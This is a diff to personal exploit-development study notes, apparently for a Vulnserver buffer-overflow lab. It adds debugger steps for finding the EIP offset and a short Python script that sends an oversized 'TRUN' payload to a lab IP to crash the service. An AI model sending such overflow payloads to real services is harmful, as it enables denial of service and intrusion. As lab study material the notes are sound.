@@ -7,3 +7,23 @@ Behavioral analysis:
 -need to know windows IP address
 get-process | findstr /i vuln
 netstat -anop tcp | findstr <PID>
+
+Dynamic Analysis
+Immunity > File > open > <file>
+Check status "Paused" or "Running" (bottom right), use rewind and play buttons
+Use wiremask, generate string. Run the script, check the EIP in immunity
+Throw EIP value into wiremask to get offset.
+
+script:
+#!/usr/bin/python
+import socket
+
+buf = "TRUN /.:/"
+buf += "A" * 5000
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.50.186.14", 9999))
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+s.close()
